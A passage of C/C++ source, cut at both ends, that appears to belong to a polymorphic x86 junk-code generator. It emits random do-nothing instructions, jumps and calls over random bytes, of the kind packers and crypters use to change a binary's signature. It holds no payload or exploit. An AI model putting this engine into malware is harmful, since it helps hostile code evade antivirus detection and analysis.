        memcpy(AMem,&ANot,2);
        AMem+=2;
}

void DoubleNotRand(PBYTE &AMem)
{
        InvertNot(AMem,NotRand(AMem));
}

WORD NegRand(PBYTE &AMem)
{
        PWORD LRes;
        LRes=(PWORD)AMem;
        *AMem=0xF6+(BYTE)Random(1);                     //neg
        AMem++;
        *AMem=0xD8+(BYTE)Random(8);                     //reg8 | reg32
        AMem++;
        return(*LRes);
}

void InvertNeg(PBYTE &AMem,WORD ANeg)
{
        memcpy(AMem,&ANeg,2);
        AMem+=2;
}

void DoubleNegRand(PBYTE &AMem)
{
        InvertNeg(AMem,NegRand(AMem));
}

void AddReg16Num8(PBYTE &AMem,BYTE AReg,BYTE ANum)
{
        *AMem=0x66;                                                     //add | or | and | sub | xor | cmp
        AMem++;
        *AMem=0x83;
        AMem++;
        *AMem=0xC0+AReg;                                        //reg16
        AMem++;
        *AMem=ANum;                                                     //num;
        AMem++;
}

void AddReg16Num8Rand(PBYTE &AMem,BYTE ANum)
{
        AddReg16Num8(AMem,RandomReg16All(),ANum);
}

void OrReg16Num8(PBYTE &AMem,BYTE AReg,BYTE ANum)
{
        *AMem=0x66;                                                     //add | or | and | sub | xor | cmp
        AMem++;
        *AMem=0x83;
        AMem++;
        *AMem=0xC8+AReg;                                        //reg16
        AMem++;
        *AMem=ANum;                                                     //num
        AMem++;
}

void OrReg16Num8Rand(PBYTE &AMem,BYTE ANum)
{
 OrReg16Num8(AMem,RandomReg16All(),ANum);
}

void AndReg16Num8(PBYTE &AMem,BYTE AReg,BYTE ANum)
{
        *AMem=0x66;                                                     //add | or | and | sub | xor | cmp
        AMem++;
        *AMem=0x83;
        AMem++;
        *AMem=0xE0+AReg;                                        //reg16
        AMem++;
        *AMem=ANum;                                                     //num
        AMem++;
}

void AndReg16Num8Rand(PBYTE &AMem,BYTE ANum)
{
        AndReg16Num8(AMem,RandomReg16All(),ANum);
}

void SubReg16Num8(PBYTE &AMem,BYTE AReg,BYTE ANum)
{
        *AMem=0x66;                                                     //add | or | and | sub | xor | cmp
        AMem++;
        *AMem=0x83;
        AMem++;
        *AMem=0xE8+AReg;                                        //reg16
        AMem++;
        *AMem=ANum;                                                     //num
        AMem++;
}

void SubReg16Num8Rand(PBYTE &AMem,BYTE ANum)
{
        SubReg16Num8(AMem,RandomReg16All(),ANum);
}

void XorReg16Num8(PBYTE &AMem,BYTE AReg,BYTE ANum)
{
        *AMem=0x66;                                                     //add | or | and | sub | xor | cmp
        AMem++;
        *AMem=0x83;
        AMem++;
        *AMem=0xF0+AReg;                                        //reg16
        AMem++;
        *AMem=ANum;                                                     //num
        AMem++;
}

void XorReg16Num8Rand(PBYTE &AMem,BYTE ANum)
{
        XorReg16Num8(AMem,RandomReg16All(),ANum);
}

void CmpReg16Num8(PBYTE &AMem,BYTE AReg,BYTE ANum)
{
        *AMem=0x66;                                                     //add | or | and | sub | xor | cmp
        AMem++;
        *AMem=0x83;
        AMem++;
        *AMem=0xF8+AReg;                                        //reg16
        AMem++;
        *AMem=ANum;                                                     //num
        AMem++;
}

void CmpReg16Num8RandRand(PBYTE &AMem)
{
        CmpReg16Num8(AMem,RandomReg16All(),(BYTE)Random(0x100));
}

void RolReg16Num8(PBYTE &AMem,BYTE AReg,BYTE ANum)
{
        *AMem=0x66;                                                     //rol | ror
        AMem++;
        *AMem=0xC1;
        AMem++;
        *AMem=0xC0+AReg;                                        //reg16
        AMem++;
        *AMem=ANum;                                                     //num8
        AMem++;
}

void RolReg16RandNum8FullRand(PBYTE &AMem)
{
        RolReg16Num8(AMem,RandomReg16All(),(BYTE)Random(0x10)*0x10);
}

void RorReg16Num8(PBYTE &AMem,BYTE AReg,BYTE ANum)
{
        *AMem=0x66;                                                     //rol | ror
        AMem++;
        *AMem=0xC1;
        AMem++;
        *AMem=0xC1+AReg;                                        //reg16
        AMem++;
        *AMem=ANum;                                                     //num8
        AMem++;
}

void RorReg16RandNum8FullRand(PBYTE &AMem)
{
        RorReg16Num8(AMem,RandomReg16All(),(BYTE)Random(0x10)*0x10);
}

WORD XchgRand(PBYTE &AMem)
{
        PWORD LRes;
        BYTE LRnd;
        LRes=(PWORD)AMem;
        LRnd=(BYTE)Random(4);
        switch(LRnd)
        {
        case 0:
        case 1:
                *AMem=0x66+LRnd;                                //xchg
                break;
        case 2:
        case 3:
                *AMem=0x86+LRnd-2;                              //xchg
                break;
        }
        AMem++;
        switch(LRnd)
        {
        case 0:
        case 1:
                *AMem=0x90+(BYTE)Random(8);             //reg16 | reg32 
                break;
        case 2:
        case 3:
                *AMem=0xC0+(BYTE)Random(0x10);  //reg8 | reg32
                break;
        }
        AMem++;
        return(*LRes);
}

void InvertXchg(PBYTE &AMem,WORD AXchg)
{
        memcpy(AMem,&AXchg,2);
        AMem+=2;
}

void DoubleXchgRand(PBYTE &AMem)
{
        InvertXchg(AMem,XchgRand(AMem));
}

void LoopNum8(PBYTE &AMem,BYTE ANum)
{
        *AMem=0xE2;                                                     //loop
        AMem++;
        *AMem=ANum;                                                     //ANum
        AMem++;
}

void JecxzNum8(PBYTE &AMem,BYTE ANum)
{
        *AMem=0xE3;                                                     //jecxz
        AMem++;
        *AMem=ANum;                                                     //ANum
        AMem++;
}

void MovzxEcxCl(PBYTE &AMem)
{
        *AMem=0x0F;                                                     //movzx
        AMem++;
        *AMem=0xB6;                           
        AMem++;
        *AMem=0xC9;                                                     //ecx:cx
        AMem++;
}

void MovReg32Reg32Rand(PBYTE &AMem,BYTE AReg)
{
        *AMem=0x8B;                                                     //mov
        AMem++;
        *AMem=0xC0+8*AReg+RandomReg32All();     //reg32
        AMem++;
}

void CmpEaxNum32(PBYTE &AMem,DWORD ANum)
{
        *AMem=0x3D;                                                     //cmp eax
        AMem++;
        memcpy(AMem,&ANum,4);                           //num32
        AMem+=4;
}

void CmpEaxNum32Rand(PBYTE &AMem)
{
        CmpEaxNum32(AMem,Random(0xFFFFFFFF));
}

void TestEaxNum32(PBYTE &AMem,DWORD ANum)
{
        *AMem=0xA9;                                                     //test eax
        AMem++;
        memcpy(AMem,&ANum,4);                           //num32
        AMem+=4;
}

void TestEaxNum32Rand(PBYTE &AMem)
{
        TestEaxNum32(AMem,Random(0xFFFFFFFF));
}

void SubEaxNum32(PBYTE &AMem,DWORD ANum)
{
        *AMem=0x2D;                                                     //sub eax
        AMem++;
        memcpy(AMem,&ANum,4);                           //num32
        AMem+=4;
}

void AddEaxNum32(PBYTE &AMem,DWORD ANum)
{
        *AMem=0x05;                                                     //add eax
        AMem++;
        memcpy(AMem,&ANum,4);                           //num32
        AMem+=4;
}

void AndEaxNum32(PBYTE &AMem,DWORD ANum)
{
        *AMem=0x25;                                                     //and eax
        AMem++;
        memcpy(AMem,&ANum,4);                           //num32
        AMem+=4;
}

void OrEaxNum32(PBYTE &AMem,DWORD ANum)
{
        *AMem=0x0D;                                                     //or eax
        AMem++;
        memcpy(AMem,&ANum,4);                           //num32
        AMem+=4;
}

void XorEaxNum32(PBYTE &AMem,DWORD ANum)
{
        *AMem=0x35;                                                     //xor eax
        AMem++;
        memcpy(AMem,&ANum,4);                           //num32
        AMem+=4;
}

void AddReg32Num32(PBYTE &AMem,BYTE AReg,DWORD ANum)
{
        *AMem=0x81;                                                     //add | or | and | sub | xor | cmp
        AMem++;
        *AMem=0xC0+AReg;                                        //reg32
        AMem++;
        memcpy(AMem,&ANum,4);                           //num32
        AMem+=4;
}

void OrReg32Num32(PBYTE &AMem,BYTE AReg,DWORD ANum)
{
        *AMem=0x81;                                                     //add | or | and | sub | xor | cmp
        AMem++;
        *AMem=0xC8+AReg;                                        //reg32
        AMem++;
        memcpy(AMem,&ANum,4);                           //num32
        AMem+=4;
}

void AndReg32Num32(PBYTE &AMem,BYTE AReg,DWORD ANum)
{
        *AMem=0x81;                                                     //add | or | and | sub | xor | cmp
        AMem++;
        *AMem=0xE0+AReg;                                        //reg32
        AMem++;
        memcpy(AMem,&ANum,4);                           //num32
        AMem+=4;
}

void SubReg32Num32(PBYTE &AMem,BYTE AReg,DWORD ANum)
{
        *AMem=0x81;                                                     //add | or | and | sub | xor | cmp
        AMem++;
        *AMem=0xE8+AReg;                                        //reg32
        AMem++;
        memcpy(AMem,&ANum,4);                           //num32
        AMem+=4;
}

void XorReg32Num32(PBYTE &AMem,BYTE AReg,DWORD ANum)
{
        *AMem=0x81;                                                     //add | or | and | sub | xor | cmp
        AMem++;
        *AMem=0xF0+AReg;                                        //reg32
        AMem++;
        memcpy(AMem,&ANum,4);                           //num32
        AMem+=4;
}

void XorReg32Reg32(PBYTE &AMem,BYTE AReg1,BYTE AReg2)
{
        *AMem=0x31;                                                     //xor
        AMem++;
        *AMem=0xC0+AReg2*8+AReg1;                       //reg32,reg32
        AMem++;
}

BYTE XorReg32RegMem(PBYTE &AMem,BYTE AReg1,BYTE AReg2)
{
        BYTE Result=2;
        *AMem=0x33;                                                     //xor
        AMem++;
        if(AReg2==REG_EBP)
        {
                Result++;
                *AMem=AReg1*8+0x45;                             //reg32,ebp
                AMem++;
                *AMem=0x00;                                             //+0
        }
        else *AMem=AReg1*8+AReg2;                       //reg32,regmem
        AMem++;
        if(AReg2==REG_ESP)
        {
                Result++;
                *AMem=0x24;                                             //esp
                AMem++;
        }
        return(Result);
}

BYTE XorRegMemReg32(PBYTE &AMem,BYTE AReg1,BYTE AReg2)
{
        BYTE Result=2;
        *AMem=0x31;                                                     //xor
        AMem++;
        if(AReg1==REG_EBP)
        {
                Result++;
                *AMem=AReg2*8+0x45;                             //reg32,ebp
                AMem++;
                *AMem=0x00;                                             //+0
        }
        else *AMem=AReg2*8+AReg1;                       //reg32,regmem
        AMem++;
        if(AReg1==REG_ESP)
        {
                Result++;
                *AMem=0x24;                                             //esp
                AMem++;
        }
        return(Result);
}

void CmpReg32Num32(PBYTE &AMem,BYTE AReg,DWORD ANum)
{
        *AMem=0x81;                                                     //add | or | and | sub | xor | cmp
        AMem++;
        *AMem=0xF8+AReg;                                        //reg32
        AMem++;
        memcpy(AMem,&ANum,4);                           //num32
        AMem+=4;
}

BYTE TestReg32Num32(PBYTE &AMem,BYTE AReg,DWORD ANum)
{
        BYTE Result;
        if(AReg==REG_EAX) ThrowTheDice(&Result,2);
        else Result=2;
        Result+=4;
        if(Result==6)
        {
                *AMem=0xF7;                                             //test
                AMem++;
                *AMem=0xC0+AReg;                                //reg32
                AMem++;
                memcpy(AMem,&ANum,4);                   //num32
                AMem+=4;
        }
        else TestEaxNum32(AMem,ANum); 
        return(Result);
}

void TestReg32Reg32(PBYTE &AMem,BYTE AReg1,BYTE AReg2)
{
        *AMem=0x85;                                                     //test
        AMem++;
        *AMem=AReg2*8+AReg1+0xC0;                       //reg32,reg32
        AMem++;
}

BYTE TestRegMemNum32(PBYTE &AMem,BYTE AReg,DWORD ANum)
{
        BYTE Result=6;
        *AMem=0xF7;                                                     //test
        AMem++;
        if(AReg==REG_EBP)
        {
                Result++;
                *AMem=0x45;                                             //ebp
                AMem++;
                *AMem=0x00;                                             //+0
        }
        else *AMem=AReg;                                        //reg32
        AMem++;
        if(AReg==REG_ESP)
        {
                Result++;
                *AMem=0x24;                                             //esp
                AMem++;
        }
        memcpy(AMem,&ANum,4);                           //num32
        AMem+=4;
        return(Result);
}


void AddReg32RandNum32(PBYTE &AMem,DWORD ANum)
{
        AddReg32Num32(AMem,RandomReg32All(),ANum);
}

void OrReg32RandNum32(PBYTE &AMem,DWORD ANum)
{
        OrReg32Num32(AMem,RandomReg32All(),ANum);
}

void AndReg32RandNum32(PBYTE &AMem,DWORD ANum)
{
        AndReg32Num32(AMem,RandomReg32All(),ANum);
}

void SubReg32RandNum32(PBYTE &AMem,DWORD ANum)
{
        SubReg32Num32(AMem,RandomReg32All(),ANum);
}

void XorReg32RandNum32(PBYTE &AMem,DWORD ANum)
{
        XorReg32Num32(AMem,RandomReg32All(),ANum);
}

void CmpReg32RandNum32Rand(PBYTE &AMem)
{
        CmpReg32Num32(AMem,RandomReg32All(),Random(0xFFFFFFFF));
}

void TestReg32RandNum32Rand6(PBYTE &AMem)
{
        BYTE LLen;
        LLen=TestReg32Num32(AMem,RandomReg32All(),Random(0xFFFFFFFF));
        if(LLen==5)
        {
                *AMem=0x90;
                AMem++;
        }
}

void MovReg32Num32Rand(PBYTE &AMem,BYTE AReg)
{
        MovReg32Num32(AMem,AReg,Random(0xFFFFFFFF));
}

void MovReg16Num16(PBYTE &AMem,BYTE AReg,WORD ANum)
{
        *AMem=0x66;                                                     //mov
        AMem++;
        *AMem=0xB8+AReg;                                        //reg16
        AMem++;
        memcpy(AMem,&ANum,2);                           //num16
        AMem+=2;
}

void MovReg16Num16Rand(PBYTE &AMem,BYTE AReg)
{
        MovReg16Num16(AMem,AReg,(BYTE)Random(0x10000));
}

//----------------------------------------------------------------------------------
void InsertRandomInstruction(PBYTE &AMem,BYTE ALength,DWORD *ARemaining)
{
        BYTE LRegAny;
        DWORD LMaxDice,LXRem;
        switch(ALength)
        {
        case 1:
                ThrowTheDice(&LMaxDice,50);
                #ifdef RUBBISH_NOPS
                LMaxDice=11;
                #endif
                if((1<=LMaxDice)&&(LMaxDice<=10))
                {
                        Cld(AMem);
                }else
                if((11<=LMaxDice)&&(LMaxDice<=20))
                {
                        Nop(AMem);
                }else
                if((21<=LMaxDice)&&(LMaxDice<=30))
                {
                        Stc(AMem);
                }else
                if((31<=LMaxDice)&&(LMaxDice<=40))
                {
                        Clc(AMem);
                }else
                if((41<=LMaxDice)&&(LMaxDice<=50))
                {
                        Cmc(AMem);
                }
                break;

        case 2:
                ThrowTheDice(&LMaxDice,145);
                if((1<=LMaxDice)&&(LMaxDice<=10))
                {
                        XchgReg32Rand(AMem);
                }else
                if((11<=LMaxDice)&&(LMaxDice<=20))
                {
                        MovReg32Rand(AMem);
                }else
                if((21<=LMaxDice)&&(LMaxDice<=30))
                {
                        LRegAny=IncReg32Rand(AMem);
                        DecReg32(AMem,LRegAny);
                }else
                if((31<=LMaxDice)&&(LMaxDice<=40))
                {
                        LRegAny=DecReg32Rand(AMem);
                        IncReg32(AMem,LRegAny);
                }else
                if((41<=LMaxDice)&&(LMaxDice<=50))
                {
                        LRegAny=PushReg32Rand(AMem);
                        PopReg32(AMem,LRegAny);
                }else
                if((51<=LMaxDice)&&(LMaxDice<=60))
                {
                        LeaReg32Rand(AMem);
                }else
                if((61<=LMaxDice)&&(LMaxDice<=70))
                {
                        TestReg32Rand(AMem);
                }else
                if((71<=LMaxDice)&&(LMaxDice<=80))
                {
                        OrReg32Rand(AMem);
                }else
                if((81<=LMaxDice)&&(LMaxDice<=90))
                {
                        AndReg32Rand(AMem);
                }else
                if((91<=LMaxDice)&&(LMaxDice<=100))
                {
                        TestReg8Rand(AMem);
                }else
                if((101<=LMaxDice)&&(LMaxDice<=110))
                {
                        OrReg8Rand(AMem);
                }else
                if((111<=LMaxDice)&&(LMaxDice<=120))
                {
                        AndReg8Rand(AMem);
                }else
                if((121<=LMaxDice)&&(LMaxDice<=130))
                {
                        CmpRegRegNum8Rand(AMem);
                }else
                if((131<=LMaxDice)&&(LMaxDice<=132))
                {
                        Std(AMem);
                        Cld(AMem);
                }else
                if((133<=LMaxDice)&&(LMaxDice<=134))
                {
                        JmpNum8(AMem,0);
                }else
                if((135<=LMaxDice)&&(LMaxDice<=138))
                {
                        SubAlNum8(AMem,0);
                }else
                if((139<=LMaxDice)&&(LMaxDice<=140))
                {
                        TestAlNum8Rand(AMem);
                }else
                if((141<=LMaxDice)&&(LMaxDice<=142))
                {
                        AddAlNum8(AMem,0);
                }else
                if((143<=LMaxDice)&&(LMaxDice<=145))
                {
                        FNop(AMem);
                }
                break;

        case 3:
                ThrowTheDice(&LMaxDice,205);
                if((1<=LMaxDice)&&(LMaxDice<=10))
                {
                        JmpNum8(AMem,1); 
                        InsertRandomInstruction(AMem,1,&LXRem);
                }else
                if((11<=LMaxDice)&&(LMaxDice<=20))
                {
                        SubReg32Num8Rand(AMem,0);
                }else
                if((21<=LMaxDice)&&(LMaxDice<=30))
                {
                        AddReg32Num8Rand(AMem,0);
                }else
                if((31<=LMaxDice)&&(LMaxDice<=40))
                {
                        LRegAny=PushReg32Rand(AMem); 
                        IncReg32(AMem,LRegAny); 
                        PopReg32(AMem,LRegAny);
                }else
                if((41<=LMaxDice)&&(LMaxDice<=50))
                {
                        LRegAny=PushReg32Rand(AMem); 
                        DecReg32(AMem,LRegAny); 
                        PopReg32(AMem,LRegAny);
                }else
                if((51<=LMaxDice)&&(LMaxDice<=60))
                {
                        CmpRandReg32RandNum8(AMem);
                }else
                if((61<=LMaxDice)&&(LMaxDice<=70))
                {
                        TestReg8Num8Rand(AMem);
                }else
                if((71<=LMaxDice)&&(LMaxDice<=80))
                {
                        SubReg8Num8Rand(AMem,0);
                }else
                if((81<=LMaxDice)&&(LMaxDice<=90))
                {
                        AddReg8Num8Rand(AMem,0);
                }else
                if((91<=LMaxDice)&&(LMaxDice<=100))
                {
                        AndReg16Rand(AMem);
                }else
                if((101<=LMaxDice)&&(LMaxDice<=110))
                {
                        TestReg16Rand(AMem);
                }else
                if((111<=LMaxDice)&&(LMaxDice<=120))
                {
                        OrReg16Rand(AMem);
                }else
                if((121<=LMaxDice)&&(LMaxDice<=130))
                {
                        ShlReg32RandNum8FullRand(AMem);
                }else
                if((131<=LMaxDice)&&(LMaxDice<=140))
                {
                        ShrReg32RandNum8FullRand(AMem);
                }else
                if((141<=LMaxDice)&&(LMaxDice<=150))
                {
                        SalReg32RandNum8FullRand(AMem);
                }else
                if((151<=LMaxDice)&&(LMaxDice<=160))
                {
                        SarReg32RandNum8FullRand(AMem);
                }else
                if((161<=LMaxDice)&&(LMaxDice<=170))
                {
                        RolReg8RandNum8FullRand(AMem);
                }else
                if((171<=LMaxDice)&&(LMaxDice<=180))
                {
                        RorReg8RandNum8FullRand(AMem);
                }else
                if((181<=LMaxDice)&&(LMaxDice<=190))
                {
                        RolReg32RandNum8FullRand(AMem);
                }else
                if((191<=LMaxDice)&&(LMaxDice<=200))
                {
                        RorReg32RandNum8FullRand(AMem);
                }else
                if((201<=LMaxDice)&&(LMaxDice<=203))
                {
                        PushReg32(AMem,REG_EDX);
                        Cdq(AMem);
                        PopReg32(AMem,REG_EDX);
                }else
                if((204<=LMaxDice)&&(LMaxDice<=205))
                {
                        LRegAny=PushReg32Rand(AMem); 
                        InsertRandomInstruction(AMem,1,&LXRem); 
                        PopReg32(AMem,LRegAny);
                }
                break;

        case 4:
                ThrowTheDice(&LMaxDice,170);
                if((1<=LMaxDice)&&(LMaxDice<=20))
                {
                        JmpNum8(AMem,2); 
                        InsertRandomInstruction(AMem,2,&LXRem);
                }else
                if((21<=LMaxDice)&&(LMaxDice<=40))
                {
                        LRegAny=PushReg32Rand(AMem); 
                        InsertRandomInstruction(AMem,2,&LXRem); 
                        PopReg32(AMem,LRegAny);
                }else
                if((41<=LMaxDice)&&(LMaxDice<=50))
                {
                        TestAxNum16Rand(AMem);
                }else
                if((51<=LMaxDice)&&(LMaxDice<=60))
                {
                        CmpAxNum16Rand(AMem);
                }else
                if((61<=LMaxDice)&&(LMaxDice<=63))
                {
                        DoubleXorRand(AMem);
                }else
                if((64<=LMaxDice)&&(LMaxDice<=66))
                {
                        DoubleNegRand(AMem);
                }else
                if((67<=LMaxDice)&&(LMaxDice<=70))
                {
                        DoubleNotRand(AMem);
                }else
                if((71<=LMaxDice)&&(LMaxDice<=80))
                {
                        AddReg16Num8Rand(AMem,0);
                }else
                if((81<=LMaxDice)&&(LMaxDice<=90))
                {
                        OrReg16Num8Rand(AMem,0);
                }else
                if((91<=LMaxDice)&&(LMaxDice<=100))
                {
                        AndReg16Num8Rand(AMem,0xFF);
                }else
                if((101<=LMaxDice)&&(LMaxDice<=110))
                {
                        SubReg16Num8Rand(AMem,0);
                }else
                if((111<=LMaxDice)&&(LMaxDice<=120))
                {
                        XorReg16Num8Rand(AMem,0);
                }else
                if((121<=LMaxDice)&&(LMaxDice<=130))
                {
                        CmpReg16Num8RandRand(AMem);
                }else
                if((131<=LMaxDice)&&(LMaxDice<=140))
                {
                        RolReg16RandNum8FullRand(AMem);
                }else
                if((141<=LMaxDice)&&(LMaxDice<=150))
                {
                        RorReg16RandNum8FullRand(AMem);
                }else
                if((151<=LMaxDice)&&(LMaxDice<=155))
                {
                        DoubleXchgRand(AMem);
                }else
                if((156<=LMaxDice)&&(LMaxDice<=160))
                {
                        LRegAny=PushReg32Rand(AMem); 
                        MovReg32Reg32Rand(AMem,LRegAny); 
                        PopReg32(AMem,LRegAny);
                }else
                if((161<=LMaxDice)&&(LMaxDice<=170))
                {
                        PushReg32Rand(AMem); 
                        AddReg32Num8(AMem,REG_ESP,4);
                }
                break;

        case 5:
                ThrowTheDice(&LMaxDice,150);
                if((1<=LMaxDice)&&(LMaxDice<=30))
                {
                        JmpNum8(AMem,3); 
                        InsertRandomInstruction(AMem,3,&LXRem);
                }else
                if((31<=LMaxDice)&&(LMaxDice<=60))
                {
                        LRegAny=PushReg32Rand(AMem); 
                        InsertRandomInstruction(AMem,3,&LXRem); 
                        PopReg32(AMem,LRegAny);
                }else
                if((61<=LMaxDice)&&(LMaxDice<=70))
                {
                        LRegAny=PushReg32Rand(AMem); 
                        PushNum8Rand(AMem); 
                        PopReg32(AMem,LRegAny); 
                        PopReg32(AMem,LRegAny);
                }else
                if((71<=LMaxDice)&&(LMaxDice<=80))
                {
                        PushNum8Rand(AMem); 
                        AddReg32Num8(AMem,REG_ESP,4);
                }else
                if((81<=LMaxDice)&&(LMaxDice<=90))
                {
                        AddEaxNum32(AMem,0);
                }else
                if((91<=LMaxDice)&&(LMaxDice<=100))
                {
                        OrEaxNum32(AMem,0);
                }else
                if((101<=LMaxDice)&&(LMaxDice<=110))
                {
                        AndEaxNum32(AMem,0xFFFFFFFF);
                }else
                if((111<=LMaxDice)&&(LMaxDice<=120))
                {
                        SubEaxNum32(AMem,0);
                }else
                if((121<=LMaxDice)&&(LMaxDice<=130))
                {
                        XorEaxNum32(AMem,0);
                }else
                if((131<=LMaxDice)&&(LMaxDice<=140))
                {
                        CmpEaxNum32Rand(AMem);
                }else
                if((141<=LMaxDice)&&(LMaxDice<=150))
                {
                        TestEaxNum32Rand(AMem);
                }
                break;

        case 6:
                ThrowTheDice(&LMaxDice,161);
                if((1<=LMaxDice)&&(LMaxDice<=40))
                {
                        JmpNum8(AMem,4); 
                        InsertRandomInstruction(AMem,4,&LXRem);
                }else
                if((41<=LMaxDice)&&(LMaxDice<=80))
                {
                        LRegAny=PushReg32Rand(AMem); 
                        InsertRandomInstruction(AMem,4,&LXRem); 
                        PopReg32(AMem,LRegAny);
                }else
                if((81<=LMaxDice)&&(LMaxDice<=90))
                {
                        AddReg32RandNum32(AMem,0);
                }else
                if((91<=LMaxDice)&&(LMaxDice<=100))
                {
                        OrReg32RandNum32(AMem,0);
                }else
                if((101<=LMaxDice)&&(LMaxDice<=110))
                {
                        AndReg32RandNum32(AMem,0xFFFFFFFF);
                }else
                if((111<=LMaxDice)&&(LMaxDice<=120))
                {
                        SubReg32RandNum32(AMem,0);
                }else
                if((121<=LMaxDice)&&(LMaxDice<=130))
                {
                        XorReg32RandNum32(AMem,0);
                }else
                if((131<=LMaxDice)&&(LMaxDice<=140))
                {
                        CmpReg32RandNum32Rand(AMem);
                }else
                if((141<=LMaxDice)&&(LMaxDice<=150))
                {
                        TestReg32RandNum32Rand6(AMem);
                }else
                if((151<=LMaxDice)&&(LMaxDice<=161))
                {
                        LRegAny=PushReg32Rand(AMem); 
                        MovReg16Num16Rand(AMem,LRegAny); 
                        PopReg32(AMem,LRegAny);
                }
                break;

        case 7:
                ThrowTheDice(&LMaxDice,110);
                if((1<=LMaxDice)&&(LMaxDice<=50))
                {
                        JmpNum8(AMem,5); 
                        InsertRandomInstruction(AMem,5,&LXRem);
                }else
                if((51<=LMaxDice)&&(LMaxDice<=100))
                {
                        LRegAny=PushReg32Rand(AMem); 
                        InsertRandomInstruction(AMem,5,&LXRem); 
                        PopReg32(AMem,LRegAny);
                }else
                if((101<=LMaxDice)&&(LMaxDice<=110))
                {
                        LRegAny=PushReg32Rand(AMem); 
                        MovReg32Num32Rand(AMem,LRegAny); 
                        PopReg32(AMem,LRegAny);
                }
                break;

        case 8:
                ThrowTheDice(&LMaxDice,120);
                if((1<=LMaxDice)&&(LMaxDice<=60))
                {
                        JmpNum8(AMem,6); 
                        InsertRandomInstruction(AMem,6,&LXRem);
                }else
                if((61<=LMaxDice)&&(LMaxDice<=120))
                {
                        LRegAny=PushReg32Rand(AMem); 
                        InsertRandomInstruction(AMem,6,&LXRem); 
                        PopReg32(AMem,LRegAny);
                }
                break;

        case 9:
        case 10:
                ThrowTheDice(&LMaxDice,200);
                if((1<=LMaxDice)&&(LMaxDice<=100))
                {
                        JmpNum8(AMem,ALength-2); 
                        InsertRandomInstruction(AMem,ALength-2,&LXRem);
                }else
                if((101<=LMaxDice)&&(LMaxDice<=200))
                {
                        LRegAny=PushReg32Rand(AMem); 
                        InsertRandomInstruction(AMem,ALength-2,&LXRem); 
                        PopReg32(AMem,LRegAny);
                }
                break;
        }
        if(ALength<11) *ARemaining-=ALength;
}
//generates a buffer of instructions that does nothing
//don't forget that flags are usually changed here
//and don't use nops
__stdcall void GenerateRubbishCode(PBYTE AMem,DWORD ASize,DWORD AVirtAddr)
{
        PBYTE LPB;
        BYTE LReg;
        DWORD LDice,LDecSize,LSize,LAddr;

        LPB=AMem;
        LSize=ASize;

        while(int(LSize)>0)
        {
                ThrowTheDice(&LDice,6);                 //1-5 generate one small instruction
                                                                                //6 generate a full size instruction

                if(LSize<32)LDice=1;                    //for small bufs use small instructions
                if(AVirtAddr==0) LDice=1;               //some extra instructions use this

                #ifdef RUBBISH_NOPS
                LDice=1;
                #endif
                if(LDice<6)                                             //generate a full size instruction
                {                                                               //generate small instructions
                        ThrowTheDice(&LDice,LSize*100);//001..100 for one byte instructions
                                                                                //011..200 for two bytes instructions
                                                                                //etc.
                                                                                //but you shouldn't use all of them

                        #ifdef RUBBISH_NOPS
                        LDice=1;
                        #endif
                        if(LSize==1) LDice=1;            //have no other chance

                        if((1<=LDice)&&(LDice<=2))
                        {
                                InsertRandomInstruction(LPB,1,&LSize);      //one byte instructions
                        }else
                        if((101<=LDice)&&(LDice<=104))
                        {
                                InsertRandomInstruction(LPB,2,&LSize);      //two bytes instructions
                        }else
                        if((201<=LDice)&&(LDice<=208))
                        {
                                InsertRandomInstruction(LPB,3,&LSize);      //three bytes instructions
                        }else
                        if((301<=LDice)&&(LDice<=316))
                        {
                                InsertRandomInstruction(LPB,4,&LSize);      //four bytes instructions
                        }else
                        if((401<=LDice)&&(LDice<=432))
                        {
                                InsertRandomInstruction(LPB,5,&LSize);      //five bytes instructions
                        }else
                        if((501<=LDice)&&(LDice<=564))
                        {
                                InsertRandomInstruction(LPB,6,&LSize);      //six bytes instructions
                        }else
                        {
                                InsertRandomInstruction(LPB,(BYTE)((LDice+99)/100),&LSize); //longer instructions
                        }
                }
                else
                {
                        //ThrowTheDice(&LDice,100);
                        ThrowTheDice(&LDice,63);
                        //if(LDice<76) LDecSize=LSize;
                        if(LDice<57) LDecSize=LSize;
                        else LDecSize=0;
                        if((1<=LDice)&&(LDice<=18))             //use rel jump
                        {                       
                                RelJmpAddr32(LPB,LSize-5);      //5 jump
                                PutRandomBuffer(LPB,LSize-5);
                        }else
                        if((19<=LDice)&&(LDice<=37))    //use rel call
                        {
                                LReg=PushReg32Rand(LPB);
                                ThrowTheDice(&LDice);
                                if(LDice>3) LAddr=LSize-8;      //1 push, 5 call, 1 pop, 1 pop
                                else LAddr=LSize-10;            //1 push, 5 call, 3 add, 1 pop
                                
                                RelCallAddr(LPB,LAddr);
                                PutRandomBuffer(LPB,LAddr);
                                if(LDice>3) PopReg32(LPB,LReg);
                                else AddReg32Num8(LPB,REG_ESP,4);
                                PopReg32(LPB,LReg);
                        }else
/*                      this code can't be use for dll, because we do need relocations for it
                        maybe in future we'll add relocations for this code
                        if((38<=LDice)&&(LDice<=56))    //use reg jmp
                        {
                                LReg=PushReg32Rand(LPB);
                                ThrowTheDice(&LDice);
                                LAddr=AVirtAddr+ASize-1;        //1 pop
                                                                                        //use ASize cuz of not rel jmp
                                if(LDice>3)
                                {
                                        MovReg32Num32(LPB,LReg,LAddr);
                                        LAddr=LSize-9;                   //1 push, 5 mov, 2 jmp, 1 pop
                                }
                                else
                                {
                                        PushNum32(LPB,LAddr);
                                        PopReg32(LPB,LReg);
                                        LAddr=LSize-10;                  //1 push, 5 push, 1 pop, 2 jmp, 1 pop
                                }
                                JmpReg32(LPB,LReg);
                                PutRandomBuffer(LPB,LAddr);
                                PopReg32(LPB,LReg);
                        }else
                        if((57<=LDice)&&(LDice<=75))                    //use reg call
                        {
                                LReg=PushReg32Rand(LPB);
                                ThrowTheDice(&LDice,8); //1,2 - push,mov,call,pop,pop
                                        //3,4 - push,mov,call,add,pop
                                        //5,6 - push,push,pop,call,pop,pop
                                        //7,8 - push,push,pop,call,add,pop

                                switch(LDice)
                                {
                                case 1:
                                case 2:
                                case 5:
                                case 6:
                                        LAddr=AVirtAddr+ASize-2; //1 pop, 1 pop
                                        break;
                                default:
                                        LAddr=AVirtAddr+ASize-4;    //1 pop, 3 add
                                }

                                if(LDice<5)
                                {
                                        MovReg32Num32(LPB,LReg,LAddr);
                                        if(LDice<3) LAddr=LSize-10;     //1 push, 5 mov, 2 call, 1 pop, 1 pop
                                        else LAddr=LSize-12;            //1 push, 5 mov, 2 call, 3 add, 1 pop
                                }
                                else
                                {
                                        PushNum32(LPB,LAddr);
                                        PopReg32(LPB,LReg);
